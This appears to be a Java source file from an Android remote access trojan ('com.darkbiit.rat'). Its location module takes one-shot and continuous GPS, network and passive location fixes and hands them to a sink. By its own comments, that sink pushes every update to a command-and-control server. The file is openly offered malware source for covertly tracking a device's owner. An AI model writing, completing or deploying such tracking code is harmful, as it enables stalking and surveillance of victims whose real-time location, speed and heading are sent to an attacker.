package com.darkbiit.rat;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Location tracking.
 *
 * The service registers a LocationListener and pushes a fix to the C2 on
 * every update. Providers are requested in order of accuracy:
 * GPS -> NETWORK -> PASSIVE.
 *
 * On Android 12+ the operator has to grant ACCESS_FINE_LOCATION; the result
 * map says which provider was actually used.
 */
public final class RatLocation {

    private RatLocation() {
    }

    /** One-shot fix from the best available provider. */
    public static Map<String, Object> fix(Context ctx) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        if (!hasPermission(ctx)) {
            out.put("ok", false);
            out.put("error", "location permission not granted");
            return out;
        }
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) {
            out.put("ok", false);
            out.put("error", "no location service");
            return out;
        }
        try {
            Location best = null;
            for (String provider : providers(lm)) {
                Location l = lm.getLastKnownLocation(provider);
                if (l != null && (best == null || l.getTime() > best.getTime())) {
                    best = l;
                }
            }
            if (best == null) {
                out.put("ok", false);
                out.put("error", "no last known location");
                return out;
            }
            out.put("ok", true);
            out.putAll(describe(best));
            return out;
        } catch (SecurityException e) {
            out.put("ok", false);
            out.put("error", "SecurityException: " + e.getMessage());
            return out;
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
            return out;
        }
    }

    /**
     * Starts continuous tracking. The listener pushes fixes through the
     * supplied sink; the caller owns the lifecycle.
     */
    public static LocationListener start(Context ctx, final FixSink sink, long intervalMs) {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null || !hasPermission(ctx)) {
            return null;
        }
        LocationListener listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                Map<String, Object> m = new LinkedHashMap<String, Object>();
                m.put("ok", true);
                m.putAll(describe(location));
                sink.onFix(m);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
            }

            @Override
            public void onProviderEnabled(String provider) {
            }

            @Override
            public void onProviderDisabled(String provider) {
            }
        };
        try {
            for (String provider : providers(lm)) {
                lm.requestLocationUpdates(provider, intervalMs, 5f, listener, Looper.getMainLooper());
            }
        } catch (SecurityException e) {
            RatLog.w("location updates denied: " + e.getMessage());
            return null;
        } catch (Throwable t) {
            RatLog.w("location start failed: " + t.getMessage());
            return null;
        }
        return listener;
    }

    /** Stops tracking. */
    public static void stop(Context ctx, LocationListener listener) {
        if (listener == null) {
            return;
        }
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm != null) {
                lm.removeUpdates(listener);
            }
        } catch (Throwable ignored) {
            // nothing to do
        }
    }

    /** Providers in the order the code prefers them. */
    private static String[] providers(LocationManager lm) {
        try {
            java.util.List<String> all = lm.getProviders(true);
            java.util.List<String> order = new java.util.ArrayList<String>();
            if (all != null) {
                if (all.contains(LocationManager.GPS_PROVIDER)) {
                    order.add(LocationManager.GPS_PROVIDER);
                }
                if (all.contains(LocationManager.NETWORK_PROVIDER)) {
                    order.add(LocationManager.NETWORK_PROVIDER);
                }
                if (all.contains(LocationManager.PASSIVE_PROVIDER)) {
                    order.add(LocationManager.PASSIVE_PROVIDER);
                }
                for (String p : all) {
                    if (!order.contains(p)) {
                        order.add(p);
                    }
                }
            }
            if (order.isEmpty()) {
                order.add(LocationManager.GPS_PROVIDER);
                order.add(LocationManager.NETWORK_PROVIDER);
            }
            return order.toArray(new String[0]);
        } catch (Throwable t) {
            return new String[] { LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER };
        }
    }

    /** Describes a Location as a flat map. */
    public static Map<String, Object> describe(Location l) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        m.put("provider", l.getProvider());
        m.put("latitude", l.getLatitude());
        m.put("longitude", l.getLongitude());
        m.put("accuracy", l.getAccuracy());
        m.put("altitude", l.hasAltitude() ? l.getAltitude() : null);
        m.put("speed", l.hasSpeed() ? l.getSpeed() : null);
        m.put("bearing", l.hasBearing() ? l.getBearing() : null);
        m.put("time", l.getTime());
        return m;
    }

    private static boolean hasPermission(Context ctx) {
        return ctx.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED
                || ctx.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }

    /** Callback for location updates. */
    public interface FixSink {
        void onFix(Map<String, Object> fix);
    }

    /** Unused handler helper. */
    static Handler mainHandler() {
        return new Handler(Looper.getMainLooper());
    }
}
